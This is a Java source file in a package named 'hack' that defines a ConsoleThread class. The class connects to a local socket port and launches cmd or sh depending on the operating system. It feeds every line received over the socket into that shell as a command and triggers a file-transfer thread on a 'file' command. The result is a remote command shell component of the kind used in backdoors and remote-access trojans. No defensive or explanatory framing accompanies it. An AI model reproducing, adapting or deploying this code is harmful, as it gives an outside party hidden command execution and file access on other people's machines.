/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package hack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.StringTokenizer;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author DougM
 */
public class ConsoleThread extends Thread {

    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private Process proccess;
    private BufferedReader proccessReader;
    //private BufferedReader proccessErrorReader;
    private PrintWriter proccessWriter;
    private ProcessThread proccessThread;
    //private ProcessThread proccessErrorThread;

    public ConsoleThread(Integer port) throws IOException {
        super("Console Thread");

        socket = new Socket("127.0.0.1", port);

        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(socket.getOutputStream(), true);

        if (isWindows()) {
        	ProcessBuilder pb = new ProcessBuilder("cmd");
            pb.redirectErrorStream(true);
            proccess = pb.start();
        } else {
        	ProcessBuilder pb = new ProcessBuilder("sh");
            pb.redirectErrorStream(true);
            proccess = pb.start();
        }

        proccessReader = new BufferedReader(new InputStreamReader(proccess.getInputStream()));
        //proccessErrorReader = new BufferedReader(new InputStreamReader(proccess.getErrorStream()));
        proccessWriter = new PrintWriter(proccess.getOutputStream(), true);

        proccessThread = new ProcessThread(this, proccessReader);
        //proccessErrorThread = new ProcessThread(this, proccessErrorReader);
    }

    @Override
    public void run() {
        proccessThread.start();
        //proccessErrorThread.start();

        try {
            String buffer;

            while ((buffer = in.readLine()) != null) {
                if (!buffer.equals("")) {
                    StringTokenizer tok = new StringTokenizer(buffer);

                    String cmd = tok.nextToken();

                    if (cmd.equals("file")) {
                        if (tok.hasMoreTokens()) {
                            TransferThread transferThread = new TransferThread(tok.nextToken());
                            transferThread.start();
                        }
                    } else {
                        proccessWriter.println(buffer);
                    }
                }
            }
        } catch (IOException ex) {
            Logger.getLogger(ProcessThread.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public PrintWriter getOut() {
    	return out;
    }

    public static boolean isWindows() {
        String os = System.getProperty("os.name").toLowerCase();

        return os.indexOf("win") >= 0;
    }

    public static boolean isMac() {
        String os = System.getProperty("os.name").toLowerCase();

        return os.indexOf("mac") >= 0;
    }

    public static boolean isUnix() {
        String os = System.getProperty("os.name").toLowerCase();

        return os.indexOf("nix") >= 0 || os.indexOf("nux") >= 0;
    }
}
